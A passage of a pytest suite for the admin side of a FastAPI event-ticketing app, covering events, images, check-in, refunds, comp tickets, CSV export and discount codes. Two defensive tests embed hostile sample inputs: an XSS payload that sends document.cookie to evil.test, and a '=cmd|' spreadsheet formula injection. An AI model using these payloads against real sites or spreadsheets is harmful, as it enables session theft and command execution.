from unittest.mock import patch

import boto3
import pytest
from botocore.exceptions import ClientError
from fastapi.testclient import TestClient

from app import auth
from app.config import settings
from app.db import (
    ANNOUNCEMENTS,
    DISCOUNT_CODES,
    EVENTS,
    FAQ_ENTRIES,
    ORDERS,
    PAST_BENEFICIARIES,
    TICKETS,
    WAITLIST,
)
from app.main import app


@pytest.fixture
def admin_client(dynamodb_tables):
    """A client signed in as an admin (a clown in the "admins" group).

    Token verification itself is covered end-to-end in tests/test_auth.py
    against real RS256 signatures; stubbing it here keeps these tests about
    the routes.
    """
    with patch.object(
        auth, "verify_cognito_token",
        return_value={"sub": "admin-1", "cognito:groups": ["admins"]},
    ):
        client = TestClient(app)
        client.cookies.set(settings.session_cookie_name, auth.issue_session("fake-id-token"))
        yield client


@pytest.fixture
def member_client(dynamodb_tables):
    """A client signed in as a plain clown -- no admin group membership."""
    with patch.object(
        auth, "verify_cognito_token", return_value={"sub": "member-1", "cognito:groups": []},
    ):
        client = TestClient(app)
        client.cookies.set(settings.session_cookie_name, auth.issue_session("fake-id-token"))
        yield client


def _put_event(event_id="evt_2026", **overrides):
    item = {
        "event_id": event_id, "year": 2026, "name": "Test", "date": "2026-03-14",
        "location": "NOLA", "description": "d", "ticket_price_cents": 15000,
        "capacity": 300, "tickets_sold_count": 5, "registration_open": True,
        "status": "open", "registration_opens_at": None, "registration_closes_at": None,
    }
    item.update(overrides)
    EVENTS().put_item(Item=item)


def _put_ticket(ticket_id, event_id="evt_2026", **overrides):
    item = {
        "ticket_id": ticket_id, "order_id": "ord_1", "event_id": event_id,
        "attendee_name": "Jane", "checked_in": False, "checked_in_at": None,
        "voided": False, "voided_at": None,
    }
    item.update(overrides)
    TICKETS().put_item(Item=item)


def _put_order(order_id="ord_1", **overrides):
    item = {
        "order_id": order_id, "event_id": "evt_2026", "buyer_name": "Jane",
        "buyer_email": "jane@example.com",
        "quantity": 2, "unit_price_cents": 15000, "total_cents": 30000,
        "status": "paid", "created_at": "2026-01-01T00:00:00Z", "discount_code": None,
        "stripe_checkout_session_id": "cs_1", "stripe_payment_intent_id": "pi_1",
    }
    item.update(overrides)
    ORDERS().put_item(Item=item)


def test_admin_redirects_unauthenticated_browsers_to_login(dynamodb_tables):
    client = TestClient(app)
    resp = client.get("/admin/events", headers={"accept": "text/html"}, follow_redirects=False)
    assert resp.status_code == 303
    assert resp.headers["location"] == "/admin/login"


def test_admin_401s_unauthenticated_api_clients(dynamodb_tables):
    client = TestClient(app)
    resp = client.post(
        "/admin/checkin/tkt_x?event_id=evt_2026", headers={"accept": "application/json"}
    )
    assert resp.status_code == 401


def test_admin_rejects_a_forged_session_cookie(dynamodb_tables):
    """The cookie is signed; editing it must not grant access."""
    client = TestClient(app)
    client.cookies.set(settings.session_cookie_name, "not-a-valid-signed-value")
    resp = client.get("/admin/events", headers={"accept": "text/html"}, follow_redirects=False)
    assert resp.status_code == 303


def test_missing_event_id_redirects_to_the_open_event(admin_client):
    """A typed URL, bookmark, or edited address bar omits event_id; a link
    from within the app never does. Previously this hit FastAPI's own
    required-param validation and returned a raw JSON 422.
    """
    _put_event(status="open")
    resp = admin_client.get("/admin/orders", follow_redirects=False)
    assert resp.status_code == 303
    assert resp.headers["location"] == "/admin/orders?event_id=evt_2026"


def test_missing_event_id_prefers_open_over_closed(admin_client):
    _put_event(event_id="evt_2025", year=2025, status="closed")
    _put_event(event_id="evt_2026", year=2026, status="open")
    resp = admin_client.get("/admin/checkin", follow_redirects=False)
    assert resp.headers["location"] == "/admin/checkin?event_id=evt_2026"


def test_missing_event_id_with_no_events_shows_a_page_not_json(admin_client):
    resp = admin_client.get("/admin/waitlist")
    assert resp.status_code == 200
    assert "No events exist yet" in resp.text


def _create_event_form(**overrides):
    data = {
        "year": "2027", "name": "Next Year Parade", "date": "2027-03-06",
        "location": "NOLA", "description": "d", "ticket_price_cents": "15000",
        "capacity": "300",
    }
    data.update(overrides)
    return data


def test_admin_can_create_event(admin_client):
    resp = admin_client.post(
        "/admin/events", data=_create_event_form(), follow_redirects=False
    )
    assert resp.status_code == 303
    items = EVENTS().scan()["Items"]
    assert any(int(e["year"]) == 2027 for e in items)


def test_new_event_page_has_the_create_form(admin_client):
    resp = admin_client.get("/admin/events/new")
    assert resp.status_code == 200
    assert 'action="/admin/events"' in resp.text
    assert 'name="year"' in resp.text


def test_admin_event_forms_have_timeline_fields(admin_client):
    _put_event()
    for path in ("/admin/events/new", "/admin/events"):
        resp = admin_client.get(path)
        assert 'name="timeline_activity"' in resp.text, path
        assert 'class="timeline-add"' in resp.text, path


def test_create_event_stores_timeline_rows(admin_client):
    data = {
        **_create_event_form(),
        # httpx encodes list values as repeated form fields
        "timeline_time": ["7:30pm", "8:00pm", ""],
        "timeline_activity": ["Cocktails", "Dinner", ""],  # last row blank -> dropped
        "timeline_details": ["On the veranda", "", ""],
    }
    resp = admin_client.post("/admin/events", data=data, follow_redirects=False)
    assert resp.status_code == 303
    event = EVENTS().get_item(Key={"event_id": "evt_2027"})["Item"]
    assert event["timeline"] == [
        {"time": "7:30pm", "activity": "Cocktails", "details": "On the veranda"},
        {"time": "8:00pm", "activity": "Dinner", "details": ""},
    ]


def test_update_event_timeline_replaces_and_can_clear(admin_client):
    _put_event(timeline=[{"time": "6pm", "activity": "Old", "details": ""}])
    admin_client.post(
        "/admin/events/evt_2026/timeline",
        data={
            "timeline_time": ["9:00pm"], "timeline_activity": ["Afterparty"],
            "timeline_details": ["Rooftop"],
        },
        follow_redirects=False,
    )
    event = EVENTS().get_item(Key={"event_id": "evt_2026"})["Item"]
    assert event["timeline"] == [
        {"time": "9:00pm", "activity": "Afterparty", "details": "Rooftop"}
    ]

    admin_client.post(
        "/admin/events/evt_2026/timeline",
        data={"timeline_time": [""], "timeline_activity": [""], "timeline_details": [""]},
        follow_redirects=False,
    )
    event = EVENTS().get_item(Key={"event_id": "evt_2026"})["Item"]
    assert event["timeline"] == []


def test_events_list_page_has_no_create_form_but_links_to_it(admin_client):
    _put_event()
    resp = admin_client.get("/admin/events")
    assert 'name="year"' not in resp.text  # the create form lives on its own page now
    assert 'href="/admin/events/new"' in resp.text


def test_event_admin_pages_carry_the_image_size_guard(admin_client):
    _put_event()
    for path in ("/admin/events", "/admin/events/new", "/admin/charity?event_id=evt_2026"):
        resp = admin_client.get(path)
        assert "Each image must be under 2 MB." in resp.text, path


def test_admin_can_create_event_with_uploaded_images(admin_client):
    resp = admin_client.post(
        "/admin/events",
        data=_create_event_form(),
        files={
            "banner_image": ("banner.jpg", b"fake-jpeg-bytes", "image/jpeg"),
            "logo_image": ("logo.png", b"fake-png-bytes", "image/png"),
        },
        follow_redirects=False,
    )
    assert resp.status_code == 303
    event = EVENTS().get_item(Key={"event_id": "evt_2027"})["Item"]
    assert event["banner_image_url"].startswith("https://event-images-test.s3.")
    assert event["logo_url"].startswith("https://event-images-test.s3.")

    # Confirm the object actually landed in S3, not just a plausible-looking URL.
    key = event["banner_image_url"].split(".amazonaws.com/", 1)[1]
    obj = boto3.client("s3", region_name="us-east-1").get_object(
        Bucket="event-images-test", Key=key
    )
    assert obj["Body"].read() == b"fake-jpeg-bytes"


def test_admin_can_upload_event_images(admin_client):
    _put_event()  # no images set
    resp = admin_client.post(
        "/admin/events/evt_2026/images",
        files={"banner_image": ("banner.jpg", b"fake-jpeg-bytes", "image/jpeg")},
        follow_redirects=False,
    )
    assert resp.status_code == 303
    event = EVENTS().get_item(Key={"event_id": "evt_2026"})["Item"]
    assert event["banner_image_url"].startswith("https://event-images-test.s3.")
    assert event.get("logo_url") is None  # untouched: no file, no remove checkbox


def test_admin_can_remove_event_images(admin_client):
    _put_event(banner_image_url="https://example.com/b.jpg", logo_url="https://example.com/l.png")
    admin_client.post(
        "/admin/events/evt_2026/images",
        data={"remove_banner_image": "1", "remove_logo_image": "1"},
        follow_redirects=False,
    )
    event = EVENTS().get_item(Key={"event_id": "evt_2026"})["Item"]
    assert event.get("banner_image_url") is None
    assert event.get("logo_url") is None


def test_admin_uploading_one_image_does_not_touch_the_other(admin_client):
    _put_event(banner_image_url="https://example.com/b.jpg", logo_url="https://example.com/l.png")
    admin_client.post(
        "/admin/events/evt_2026/images",
        files={"logo_image": ("logo.png", b"new-logo-bytes", "image/png")},
        follow_redirects=False,
    )
    event = EVENTS().get_item(Key={"event_id": "evt_2026"})["Item"]
    assert event["banner_image_url"] == "https://example.com/b.jpg"  # untouched
    assert event["logo_url"].startswith("https://event-images-test.s3.")


def test_admin_can_create_event_with_three_banner_images(admin_client):
    resp = admin_client.post(
        "/admin/events",
        data=_create_event_form(),
        files={
            "banner_image": ("b1.jpg", b"banner-one", "image/jpeg"),
            "banner_image_2": ("b2.jpg", b"banner-two", "image/jpeg"),
            "banner_image_3": ("b3.jpg", b"banner-three", "image/jpeg"),
        },
        follow_redirects=False,
    )
    assert resp.status_code == 303
    event = EVENTS().get_item(Key={"event_id": "evt_2027"})["Item"]
    for field in ("banner_image_url", "banner_image_url_2", "banner_image_url_3"):
        assert event[field].startswith("https://event-images-test.s3.")

    key = event["banner_image_url_3"].split(".amazonaws.com/", 1)[1]
    obj = boto3.client("s3", region_name="us-east-1").get_object(
        Bucket="event-images-test", Key=key
    )
    assert obj["Body"].read() == b"banner-three"


def test_admin_can_upload_extra_banner_images(admin_client):
    _put_event(banner_image_url="https://example.com/b1.jpg")
    resp = admin_client.post(
        "/admin/events/evt_2026/images",
        files={
            "banner_image_2": ("b2.jpg", b"banner-two", "image/jpeg"),
            "banner_image_3": ("b3.png", b"banner-three", "image/png"),
        },
        follow_redirects=False,
    )
    assert resp.status_code == 303
    event = EVENTS().get_item(Key={"event_id": "evt_2026"})["Item"]
    assert event["banner_image_url"] == "https://example.com/b1.jpg"  # untouched
    assert event["banner_image_url_2"].startswith("https://event-images-test.s3.")
    assert event["banner_image_url_3"].startswith("https://event-images-test.s3.")


def test_admin_can_remove_a_single_extra_banner_image(admin_client):
    _put_event(
        banner_image_url="https://example.com/b1.jpg",
        banner_image_url_2="https://example.com/b2.jpg",
        banner_image_url_3="https://example.com/b3.jpg",
    )
    admin_client.post(
        "/admin/events/evt_2026/images",
        data={"remove_banner_image_2": "1"},
        follow_redirects=False,
    )
    event = EVENTS().get_item(Key={"event_id": "evt_2026"})["Item"]
    assert event["banner_image_url"] == "https://example.com/b1.jpg"
    assert event.get("banner_image_url_2") is None
    assert event["banner_image_url_3"] == "https://example.com/b3.jpg"


def test_admin_rejects_oversized_image(admin_client):
    _put_event()
    oversized = b"x" * (2 * 1024 * 1024 + 1)
    resp = admin_client.post(
        "/admin/events/evt_2026/images",
        files={"banner_image": ("banner.jpg", oversized, "image/jpeg")},
        follow_redirects=False,
    )
    assert resp.status_code == 400
    assert "under 2mb" in resp.text.lower()
    event = EVENTS().get_item(Key={"event_id": "evt_2026"})["Item"]
    assert event.get("banner_image_url") is None


def test_admin_rejects_non_image_content_type(admin_client):
    _put_event()
    resp = admin_client.post(
        "/admin/events/evt_2026/images",
        files={"banner_image": ("banner.txt", b"not an image", "text/plain")},
        follow_redirects=False,
    )
    assert resp.status_code == 400
    assert "must be a jpeg, png, gif, or webp" in resp.text.lower()


def test_admin_events_page_shows_current_image_preview(admin_client):
    _put_event(banner_image_url="https://example.com/b.jpg")
    resp = admin_client.get("/admin/events")
    assert 'src="https://example.com/b.jpg"' in resp.text
    assert "event-image-preview" in resp.text


def test_admin_can_edit_event_details(admin_client):
    _put_event()
    resp = admin_client.post(
        "/admin/events/evt_2026/details",
        data={
            "name": "New Name", "description": "New description.", "location": "Baton Rouge",
            "address": "1 Main St", "contact_name": "Jo", "contact_email": "jo@x.test",
            "contact_phone": "555-9",
        },
        follow_redirects=False,
    )
    assert resp.status_code == 303
    event = EVENTS().get_item(Key={"event_id": "evt_2026"})["Item"]
    assert event["name"] == "New Name"
    assert event["description"] == "New description."
    assert event["location"] == "Baton Rouge"
    assert event["address"] == "1 Main St"
    assert event["contact_name"] == "Jo"
    assert event["contact_email"] == "jo@x.test"
    assert event["contact_phone"] == "555-9"


def test_admin_edit_event_details_clears_blank_contact_fields(admin_client):
    _put_event(address="old addr", contact_name="Old Contact")
    admin_client.post(
        "/admin/events/evt_2026/details",
        data={"name": "N", "description": "D", "location": "L"},  # contact fields omitted
        follow_redirects=False,
    )
    event = EVENTS().get_item(Key={"event_id": "evt_2026"})["Item"]
    assert event.get("address") is None
    assert event.get("contact_name") is None


def test_admin_can_create_event_with_contact_details(admin_client):
    admin_client.post(
        "/admin/events",
        data=_create_event_form(
            address="9 Canal St", contact_name="Sam", contact_email="sam@x.test",
            contact_phone="555-1",
        ),
        follow_redirects=False,
    )
    event = EVENTS().get_item(Key={"event_id": "evt_2027"})["Item"]
    assert event["address"] == "9 Canal St"
    assert event["contact_name"] == "Sam"
    assert event["contact_email"] == "sam@x.test"
    assert event["contact_phone"] == "555-1"


def test_admin_edit_event_details_rejects_blank_fields(admin_client):
    _put_event()
    resp = admin_client.post(
        "/admin/events/evt_2026/details",
        data={"name": "  ", "description": "New description.", "location": "Baton Rouge"},
        follow_redirects=False,
    )
    assert resp.status_code == 400
    event = EVENTS().get_item(Key={"event_id": "evt_2026"})["Item"]
    assert event["name"] == "Test"  # unchanged


def test_admin_events_page_prefills_details_form(admin_client):
    _put_event(name="Existing Name", location="Existing Location")
    resp = admin_client.get("/admin/events")
    assert 'value="Existing Name"' in resp.text
    assert 'value="Existing Location"' in resp.text


def test_admin_can_set_event_banner(admin_client):
    _put_event()
    resp = admin_client.post(
        "/admin/events/evt_2026/banner",
        data={"banner_message": "This event has been cancelled.", "banner_style": "urgent"},
        follow_redirects=False,
    )
    assert resp.status_code == 303
    # The banner form now lives on the Announcements & Alerts page.
    assert resp.headers["location"] == "/admin/announcements?event_id=evt_2026"
    event = EVENTS().get_item(Key={"event_id": "evt_2026"})["Item"]
    assert event["banner_message"] == "This event has been cancelled."
    assert event["banner_style"] == "urgent"


def test_alert_banner_form_is_on_the_announcements_page_not_events(admin_client):
    _put_event(banner_message="Heads up", banner_style="urgent")

    ann = admin_client.get("/admin/announcements?event_id=evt_2026")
    assert "Announcements &amp; Alerts" in ann.text
    assert 'action="/admin/events/evt_2026/banner"' in ann.text
    assert ">Heads up</textarea>" in ann.text  # pre-filled from the current event

    events = admin_client.get("/admin/events")
    assert 'action="/admin/events/evt_2026/banner"' not in events.text


def test_admin_can_clear_event_banner(admin_client):
    _put_event(banner_message="Old notice", banner_style="urgent")
    admin_client.post(
        "/admin/events/evt_2026/banner",
        data={"banner_message": "", "banner_style": "notice"},
        follow_redirects=False,
    )
    event = EVENTS().get_item(Key={"event_id": "evt_2026"})["Item"]
    assert event.get("banner_message") is None


def test_admin_banner_style_falls_back_to_notice_for_bad_input(admin_client):
    _put_event()
    admin_client.post(
        "/admin/events/evt_2026/banner",
        data={"banner_message": "Heads up", "banner_style": "not-a-real-style"},
        follow_redirects=False,
    )
    event = EVENTS().get_item(Key={"event_id": "evt_2026"})["Item"]
    assert event["banner_style"] == "notice"


def test_creating_an_event_for_an_existing_year_is_refused(admin_client):
    """A double-submit must not reset a live event's sales counters.

    An unconditional put would zero tickets_sold_count and drop the event back
    to draft while every paid order for it survives — capacity accounting
    silently corrupted mid-sale.
    """
    _put_event("evt_2026", tickets_sold_count=42, status="open", registration_open=True)

    resp = admin_client.post(
        "/admin/events",
        data=_create_event_form(year="2026", name="Oops Duplicate"),
        follow_redirects=False,
    )

    assert resp.status_code == 409
    assert "already exists" in resp.text

    event = EVENTS().get_item(Key={"event_id": "evt_2026"})["Item"]
    assert int(event["tickets_sold_count"]) == 42, "sales counter must survive"
    assert event["status"] == "open", "a live event must not be knocked back to draft"
    assert event["name"] == "Test", "the original event is untouched"


def test_opening_an_event_closes_any_other_open_event(admin_client):
    """The public page shows `the` open event; two would make it arbitrary."""
    _put_event("evt_2026", status="open", registration_open=True)
    _put_event("evt_2027", status="draft", registration_open=False)

    admin_client.post("/admin/events/evt_2027/open", follow_redirects=False)

    assert EVENTS().get_item(Key={"event_id": "evt_2026"})["Item"]["status"] == "closed"
    assert EVENTS().get_item(Key={"event_id": "evt_2027"})["Item"]["status"] == "open"


def test_checkin_marks_ticket_checked_in(admin_client):
    _put_ticket("tkt_abc")
    resp = admin_client.post("/admin/checkin/tkt_abc?event_id=evt_2026")
    assert resp.status_code == 200
    assert resp.json()["status"] == "checked_in"
    assert TICKETS().get_item(Key={"ticket_id": "tkt_abc"})["Item"]["checked_in"] is True


def test_checkin_rejects_unknown_ticket(admin_client):
    resp = admin_client.post("/admin/checkin/tkt_nonexistent?event_id=evt_2026")
    assert resp.status_code == 200
    assert resp.json()["status"] == "invalid"


def test_checkin_flags_duplicate(admin_client):
    _put_ticket("tkt_dup", checked_in=True, checked_in_at="2026-03-14T20:00:00Z")
    resp = admin_client.post("/admin/checkin/tkt_dup?event_id=evt_2026")
    assert resp.json()["status"] == "already_checked_in"


def test_checkin_rejects_ticket_from_a_different_event(admin_client):
    """Past years stay queryable, so last year's QR code is a live object."""
    _put_ticket("tkt_lastyear", event_id="evt_2025")
    resp = admin_client.post("/admin/checkin/tkt_lastyear?event_id=evt_2026")
    assert resp.json()["status"] == "wrong_event"
    assert TICKETS().get_item(Key={"ticket_id": "tkt_lastyear"})["Item"]["checked_in"] is False


def test_checkin_rejects_voided_ticket(admin_client):
    _put_ticket("tkt_refunded", voided=True, voided_at="2026-02-01T00:00:00Z")
    resp = admin_client.post("/admin/checkin/tkt_refunded?event_id=evt_2026")
    assert resp.json()["status"] == "voided"
    assert TICKETS().get_item(Key={"ticket_id": "tkt_refunded"})["Item"]["checked_in"] is False


def test_checkin_from_a_browser_form_redirects_instead_of_returning_json(admin_client):
    """The name/email search results' Check In button is a plain HTML form
    submit, not the JS scanner's fetch -- it should behave like every other
    admin form (redirect back to the page), not hand back a raw JSON body.
    """
    _put_ticket("tkt_abc")
    resp = admin_client.post(
        "/admin/checkin/tkt_abc?event_id=evt_2026&q=jane",
        headers={"accept": "text/html"},
        follow_redirects=False,
    )
    assert resp.status_code == 303
    assert resp.headers["location"] == "/admin/checkin?event_id=evt_2026&q=jane"


def test_checkin_search_finds_by_buyer_name_and_email(admin_client):
    _put_order("ord_1", buyer_name="Jane Doe", buyer_email="jane@example.com")
    _put_ticket("tkt_1", order_id="ord_1", attendee_name="Jane Doe")

    by_name = admin_client.get("/admin/checkin?event_id=evt_2026&q=jane doe")
    assert "Jane Doe" in by_name.text

    by_email = admin_client.get("/admin/checkin?event_id=evt_2026&q=jane@example.com")
    assert "Jane Doe" in by_email.text


def test_checkin_search_finds_by_attendee_name_even_when_buyer_differs(admin_client):
    _put_order("ord_1", buyer_name="Jane Doe", buyer_email="jane@example.com")
    _put_ticket("tkt_1", order_id="ord_1", attendee_name="Someone Else")

    resp = admin_client.get("/admin/checkin?event_id=evt_2026&q=someone else")
    assert "Someone Else" in resp.text


def test_checkin_search_excludes_other_events(admin_client):
    _put_order("ord_1", event_id="evt_2025", buyer_name="Jane Doe")
    _put_ticket("tkt_1", event_id="evt_2025", order_id="ord_1")

    resp = admin_client.get("/admin/checkin?event_id=evt_2026&q=jane")
    assert "Jane Doe" not in resp.text


def test_checkin_search_shows_no_matches_message(admin_client):
    resp = admin_client.get("/admin/checkin?event_id=evt_2026&q=nobody-like-this")
    assert "No matches" in resp.text


@patch("app.routes.admin.send_confirmation_email")
def test_resend_email_from_checkin_redirects_back_to_search(mock_send, admin_client):
    _put_order("ord_1")
    _put_ticket("tkt_1", order_id="ord_1")

    resp = admin_client.post(
        "/admin/checkin/ord_1/resend-email?q=jane", follow_redirects=False
    )
    assert resp.status_code == 303
    assert resp.headers["location"] == "/admin/checkin?event_id=evt_2026&q=jane"
    mock_send.assert_called_once()


@patch("app.routes.admin.stripe.Refund.create")
def test_refund_marks_refunded_voids_tickets_and_frees_capacity(mock_refund, admin_client):
    _put_event(tickets_sold_count=5)
    _put_order("ord_refund")
    _put_ticket("tkt_r1", order_id="ord_refund")
    _put_ticket("tkt_r2", order_id="ord_refund")

    resp = admin_client.post("/admin/orders/ord_refund/refund", follow_redirects=False)

    assert resp.status_code == 303
    mock_refund.assert_called_once_with(payment_intent="pi_1")
    assert ORDERS().get_item(Key={"order_id": "ord_refund"})["Item"]["status"] == "refunded"
    assert int(EVENTS().get_item(Key={"event_id": "evt_2026"})["Item"]["tickets_sold_count"]) == 3

    for tid in ("tkt_r1", "tkt_r2"):
        ticket = TICKETS().get_item(Key={"ticket_id": tid})["Item"]
        assert ticket["voided"] is True, "a refunded ticket must not scan at the door"


@patch("app.routes.admin.stripe.Refund.create")
def test_refund_is_idempotent(mock_refund, admin_client):
    """Double-clicking Refund must not refund twice or free capacity twice."""
    _put_event(tickets_sold_count=5)
    _put_order("ord_refund")

    admin_client.post("/admin/orders/ord_refund/refund", follow_redirects=False)
    admin_client.post("/admin/orders/ord_refund/refund", follow_redirects=False)

    assert mock_refund.call_count == 1
    assert int(EVENTS().get_item(Key={"event_id": "evt_2026"})["Item"]["tickets_sold_count"]) == 3


@patch("app.routes.admin.stripe.Refund.create", side_effect=RuntimeError("stripe down"))
def test_failed_refund_leaves_the_order_paid(mock_refund, admin_client):
    _put_event(tickets_sold_count=5)
    _put_order("ord_refund")

    resp = admin_client.post("/admin/orders/ord_refund/refund", follow_redirects=False)

    assert resp.status_code == 502
    assert ORDERS().get_item(Key={"order_id": "ord_refund"})["Item"]["status"] == "paid"
    assert int(EVENTS().get_item(Key={"event_id": "evt_2026"})["Item"]["tickets_sold_count"]) == 5


def test_refund_unknown_order_404s(admin_client):
    resp = admin_client.post("/admin/orders/ord_missing/refund")
    assert resp.status_code == 404


# ---- Give tickets (comps) ----

def test_give_tickets_page_lists_events(admin_client):
    _put_event()
    resp = admin_client.get("/admin/give-tickets")
    assert resp.status_code == 200
    assert 'action="/admin/give-tickets"' in resp.text
    assert 'value="evt_2026"' in resp.text
    assert 'name="donation' not in resp.text  # no donation on the comp form


def test_give_tickets_creates_paid_comp_order_with_tickets(admin_client):
    _put_event(tickets_sold_count=5, capacity=300)
    with patch("app.fulfillment.send_confirmation_email") as mock_email:
        resp = admin_client.post(
            "/admin/give-tickets",
            data={
                "event_id": "evt_2026", "quantity": "3",
                "buyer_name": "  Guest of Honor  ", "buyer_email": " vip@example.com ",
            },
            follow_redirects=False,
        )
    assert resp.status_code == 303
    assert resp.headers["location"] == "/admin/orders?event_id=evt_2026"

    orders = ORDERS().scan()["Items"]
    assert len(orders) == 1
    order = orders[0]
    assert order["status"] == "paid"
    assert order["comp"] is True
    assert int(order["total_cents"]) == 0
    assert int(order["unit_price_cents"]) == 0
    assert order["buyer_name"] == "Guest of Honor"
    assert order["buyer_email"] == "vip@example.com"
    assert order["stripe_payment_intent_id"] is None

    tickets = [t for t in TICKETS().scan()["Items"] if t["order_id"] == order["order_id"]]
    assert len(tickets) == 3
    mock_email.assert_called_once()

    event = EVENTS().get_item(Key={"event_id": "evt_2026"})["Item"]
    assert int(event["tickets_sold_count"]) == 8, "comped seats count against capacity"


def test_give_tickets_rejects_bad_input(admin_client):
    _put_event()
    for bad in (
        {"event_id": "evt_2026", "quantity": "0", "buyer_name": "A", "buyer_email": "a@x.com"},
        {"event_id": "evt_2026", "quantity": "2", "buyer_name": " ", "buyer_email": "a@x.com"},
        {"event_id": "evt_nope", "quantity": "2", "buyer_name": "A", "buyer_email": "a@x.com"},
    ):
        resp = admin_client.post("/admin/give-tickets", data=bad, follow_redirects=False)
        assert resp.status_code == 400, bad
    assert ORDERS().scan()["Items"] == []


def test_give_tickets_flags_order_when_fulfilment_fails(admin_client):
    _put_event()
    with patch(
        "app.routes.admin.fulfill_order", side_effect=RuntimeError("SES down")
    ):
        resp = admin_client.post(
            "/admin/give-tickets",
            data={
                "event_id": "evt_2026", "quantity": "1",
                "buyer_name": "Guest", "buyer_email": "g@example.com",
            },
            follow_redirects=False,
        )
    assert resp.status_code == 500
    assert "may not have sent" in resp.text
    order = ORDERS().scan()["Items"][0]
    assert order["fulfillment_error"] is True


@patch("app.routes.admin.stripe.Refund.create")
def test_refunding_a_comp_skips_stripe_but_voids_tickets(mock_refund, admin_client):
    _put_event(tickets_sold_count=5)
    _put_order("ord_comp", comp=True, total_cents=0, unit_price_cents=0,
               stripe_payment_intent_id=None)
    _put_ticket("tkt_c1", order_id="ord_comp")

    resp = admin_client.post("/admin/orders/ord_comp/refund", follow_redirects=False)

    assert resp.status_code == 303
    mock_refund.assert_not_called()
    assert ORDERS().get_item(Key={"order_id": "ord_comp"})["Item"]["status"] == "refunded"
    assert TICKETS().get_item(Key={"ticket_id": "tkt_c1"})["Item"]["voided"] is True
    assert int(EVENTS().get_item(Key={"event_id": "evt_2026"})["Item"]["tickets_sold_count"]) == 3


def test_orders_list_badges_comp_orders(admin_client):
    _put_event()
    _put_order("ord_comp", comp=True, total_cents=0)
    resp = admin_client.get("/admin/orders?event_id=evt_2026")
    assert "(comp)" in resp.text


def test_orders_page_never_puts_a_buyer_name_in_a_js_string(admin_client):
    """buyer_name is public input rendered into an admin's authenticated page.

    HTML-escaping is the WRONG escaping for a JS string inside an attribute:
    the browser HTML-decodes the attribute before the JS parser runs, so
    `&#39;` becomes `'` and the payload breaks out. The name must therefore
    reach the script as data (a data-* attribute read via dataset), never as
    part of a JS source string.
    """
    payload = "'); fetch('https://evil.test/'+document.cookie); ('"
    _put_order("ord_xss", buyer_name=payload)

    resp = admin_client.get("/admin/orders?event_id=evt_2026")
    body = resp.text

    assert resp.status_code == 200
    # The quotes are what make this executable; they must never survive raw.
    assert payload not in body
    assert "');" not in body and "('" not in body
    # No inline handler may carry an interpolated value at all.
    assert "onsubmit=" not in body and "onclick=" not in body
    # Nothing attacker-controlled may appear inside the <script> block.
    script = body.split("<script>", 1)[1].split("</script>", 1)[0]
    assert "evil.test" not in script
    # It IS rendered — HTML-escaped, in an HTML context, where that escaping
    # is the correct one.
    assert "&#39;); fetch(&#39;https://evil.test/&#39;" in body
    assert 'data-buyer-name="&#39;);' in body


def test_orders_export_returns_csv(admin_client):
    _put_order("ord_csv", quantity=1, total_cents=15000)
    resp = admin_client.get("/admin/orders/export?event_id=evt_2026")
    assert resp.status_code == 200
    assert resp.headers["content-type"].startswith("text/csv")
    assert "jane@example.com" in resp.text


def test_orders_export_formats_total_as_dollars(admin_client):
    """Admins open this in a spreadsheet -- cents (15000) reads as $15,000."""
    _put_order("ord_dollars", total_cents=15000)
    _put_order("ord_dollars_small", total_cents=5)
    resp = admin_client.get("/admin/orders/export?event_id=evt_2026")
    assert "total_cents" not in resp.text
    assert "total_usd" in resp.text
    assert "150.00" in resp.text
    assert "0.05" in resp.text


def test_orders_export_neutralizes_spreadsheet_formulas(admin_client):
    """Buyer names are attacker-controlled free text that lands in a spreadsheet."""
    _put_order("ord_evil", buyer_name="=cmd|'/c calc'!A1")
    resp = admin_client.get("/admin/orders/export?event_id=evt_2026")
    # The formula prefix is escaped with a leading single quote
    assert "'=cmd" in resp.text
    # Verify no direct formula injection by checking the raw field isn't unquoted
    lines = resp.text.split('\n')
    # Find the data row (skip header)
    data_row = [l for l in lines if "ord_evil" in l][0]
    # The buyer_name field should be escaped with a single quote prefix
    assert ",'=" in data_row  # Escaped formula marker


def _create_code(admin_client, **overrides):
    data = {
        "code": "MEMBER20", "event_id": "evt_2026",
        "discount_type": "percent", "discount_value": "20", "max_uses": "",
    }
    data.update(overrides)
    return admin_client.post("/admin/discount-codes", data=data, follow_redirects=False)


def test_discount_code_is_stored_normalized(admin_client):
    _create_code(admin_client, code=" member20 ")
    assert DISCOUNT_CODES().get_item(Key={"code": "MEMBER20"}).get("Item") is not None


def test_discount_code_with_unknown_type_is_rejected(admin_client):
    """Checkout reads codes back through a strict model.

    An unrecognized discount_type written here would be a ValidationError — a
    500 — for every customer who typed the code, long after the admin who made
    the typo has gone home.
    """
    resp = _create_code(admin_client, code="BOGUS", discount_type="bogus")

    assert resp.status_code == 400
    assert "percent" in resp.text and "fixed" in resp.text
    assert DISCOUNT_CODES().get_item(Key={"code": "BOGUS"}).get("Item") is None


def test_percent_discount_over_100_is_rejected(admin_client):
    """101% clamps the total to 0 via compute_total's floor — free tickets."""
    resp = _create_code(admin_client, code="FREE", discount_type="percent",
                        discount_value="150")

    assert resp.status_code == 400
    assert "between 0 and 100" in resp.text
    assert DISCOUNT_CODES().get_item(Key={"code": "FREE"}).get("Item") is None


def test_negative_discount_value_is_rejected(admin_client):
    """A negative percent doesn't discount — it charges MORE than the subtotal."""
    for discount_type in ("percent", "fixed"):
        resp = _create_code(admin_client, code="SURCHARGE",
                            discount_type=discount_type, discount_value="-50")
        assert resp.status_code == 400, discount_type
        assert DISCOUNT_CODES().get_item(Key={"code": "SURCHARGE"}).get("Item") is None


def test_valid_fixed_discount_is_accepted(admin_client):
    resp = _create_code(admin_client, code="TENOFF", discount_type="fixed",
                        discount_value="1000")
    assert resp.status_code == 303
    code = DISCOUNT_CODES().get_item(Key={"code": "TENOFF"})["Item"]
    assert int(code["discount_value"]) == 1000


def test_waitlist_notify_marks_entry(admin_client):
    WAITLIST().put_item(Item={
        "waitlist_id": "wl_1", "event_id": "evt_2026", "name": "Sam",
        "email": "sam@example.com", "requested_quantity": 2,
        "created_at": "2026-01-01T00:00:00Z", "notified": False,
    })
    admin_client.post("/admin/waitlist/wl_1/notify", data={"event_id": "evt_2026"},
                      follow_redirects=False)
    assert WAITLIST().get_item(Key={"waitlist_id": "wl_1"})["Item"]["notified"] is True


@patch("app.routes.admin._invoke_announcement_lambda")
def test_create_announcement_writes_queued_item_and_invokes_lambda_async(mock_invoke, admin_client):
    _put_event()
    resp = admin_client.post(
        "/admin/announcements",
